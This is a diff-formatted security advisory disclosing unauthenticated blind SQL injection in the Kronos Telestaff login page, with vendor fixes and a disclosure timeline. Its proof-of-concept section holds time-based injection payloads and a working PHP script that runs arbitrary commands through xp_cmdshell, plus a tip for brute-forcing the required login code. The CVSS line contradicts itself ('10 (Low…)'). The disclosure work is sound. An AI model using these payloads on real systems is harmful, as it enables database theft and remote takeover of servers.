@@ -1,0 +1,99 @@
+Software: Kronos Telestaff Web Application
+Version: < 2.92EU29
+Homepage: http://www.kronos.com/
+CERT VU: VU#958480
+CVE: (Pending)
+CVSS: 10 (Low; AV:N/AC:L/Au:N/C:C/I:C/A:C)
+CWE: CWE-89   
+Vulnerable Component: Login page 
+
+Description
+================
+The login form is vulnerable to blind SQL injection by an unauthenticated user.
+
+
+Vulnerabilities
+================
+The vulnerability is due to the unsanitized POST parameter 'user' in login page:
+URL: [BASE URL OF Telestaff Application]/servlet/ServletController.asp
+POSTDATA=device=stdbrowser&action=doLogin&user=&pwd=&code=
+
+The exploit requires a valid "code" in the post body.  However in almost all instances we found on the internet, the "code" POST variable was hard-coded into the page.  Furthermore, the "code" POST variable is very often a 4 digit number - and can be easily discovered in ~5000 requests. 
+
+ 
+Proof of concept
+================
+PoC 1 - extract data from database
+example extract benign data e.g. 
+Injection Point:  [BASE URL OF Telestaff Application]/servlet/ServletController.asp
+POST data: 
+device=stdbrowser&action=doLogin&user=')if(DB_NAME()='TELESTAFF')waitfor%20delay'00%3a00%3a12';--&pwd=&code=<valid code>
+
+compare timing with
+
+device=stdbrowser&action=doLogin&user=')if(DB_NAME()<>'TELESTAFF')waitfor%20delay'00%3a00%3a12';--&pwd=&code=<valid code>
+
+
+PoC 2 - Execute Code Remotely
+example inject benign code e.g. ping a remote systems
+
+<?php
+	$cmd_to_execute = strToHex("ping -n 1 receive_ping_host");  // insert you own host here to detect dns lookup and/or ping; or insert other command 
+	$code=XXXX // insert valid code
+	$target_url= // insert login page url of target system i.e. example.com/webstaff-2.0/servlet/ServletController.asp?device=stdbrowser&action=doLogin&selfhosted=true
+	$payload="DECLARE @lphda VARCHAR(280);SET @lphda=".$cmd_to_execute.";EXEC master..xp_cmdshell @lphda";
+	$payload=str_replace(" ","%20",$payload);
+	$postdata="device=stdbrowser&action=doLogin&user=')".$payload."---&pwd=test&code=".$code;
+
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $target_url);
+	curl_setopt($ch, CURLOPT_POST, TRUE);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
+	curl_exec($ch);
+
+	function strToHex($string){
+	  $hex = '';
+	  for ($i=0; $i<strlen($string); $i++){
+		$ord = ord($string[$i]);
+		$hexCode = dechex($ord);
+		$hex .= substr('0'.$hexCode, -2);
+	  }
+	  return "0x".strToUpper($hex);
+	}
+
+	
+Affected Systems
+================
+From Vendor:
+Customers running TeleStaff version 2.x with Self Hosted Web Access, those customers who host their own web access, are affected and Kronos recommends that you upgrade to TeleStaff 2.92EU29 or Workforce TeleStaff.
+
+
+Solution
+================
+From Vendor:
+
+Though there is no further action needed after the installation of the update there are a couple of best practices that we suggest to further secure the production environment.
+	1. We recommend that the Web Staff Middle Tier be locked down to only be accessed from the source addresses.  For Self-Hosted Web Access this would be the Internet facing IIS server hosting the Self Hosted WebStaff module. For customers using WebStaff (www.telestaff.net) and PSM (psm.telestaff.net and m.telestaff.net) those are the IP addresses of the Kronos servers.
+	2. Customers, once configured, should remove the viewDatabases.asp script to avoid accidental information leakage to unauthorized users.
+
+	
+Timeline
+================
+2015-12-18: Discovered
+2016-01-04: Contacted Vendor
+2016-01-11: Report sent to vendor 
+2016-01-20: Received acknowledgement of vulnerable from security contact info at vendor
+2016-01-20: Vendor is remediating the issue 
+2016-10-18: Vendor issues patch
+2017-06-01: Public disclosure
+ 
+
+Discovered by
+================
+Chris Anastasio 0x616e6173746173696f [ at ] illumant.com
+Mark F. Snodgrass  0x736e6f646772617373 [ at ] illumant.com
+
+
+About Illumant
+================
+Illumant has conducted thousands of security assessment and compliance engagements, helping over 800 clients protect themselves from cyber-attacks.  Through meticulous manual analysis, Illumant helps companies navigate the security and threat landscape to become more secure, less of a target, and more compliant.  For more information, visit https://illumant.com/
